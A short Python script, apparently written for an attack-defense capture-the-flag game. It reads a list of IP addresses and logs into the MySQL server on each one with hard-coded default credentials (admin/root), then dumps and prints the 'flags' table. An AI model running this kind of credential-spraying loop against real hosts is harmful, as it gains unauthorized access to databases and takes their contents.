'''
Description: 
Autor: mukeers
Date: 2021-06-08 13:48:24
LastEditors: mukeers
LastEditTime: 2021-06-15 14:53:57
'''
# mysql 多IP连接

import pymysql
import os
import sys

def mysqlConn(line):

    try:
        db = pymysql.connect(
            line,
            "admin",
            "root",
            "flag"
        )
        cur = db.cursor()
        sql = "select * from flags"

        cur.execute(sql)
        results = cur.fetchall()
        for row in results:
            id = row[0]
            flags = row[1]
            print(db.host)
            print("id=%s,flags=%s"%(id,flags))
            return
    except pymysql.err.OperationalError as oe:
        print('Error:',oe)
        return

def main():
    file = open('G:/python_jioben/try/ip.txt','r')
    for line in file.readlines():
        line = line.strip('\n')
        print(line)
        mysqlConn(line)

if __name__ == '__main__':
    main()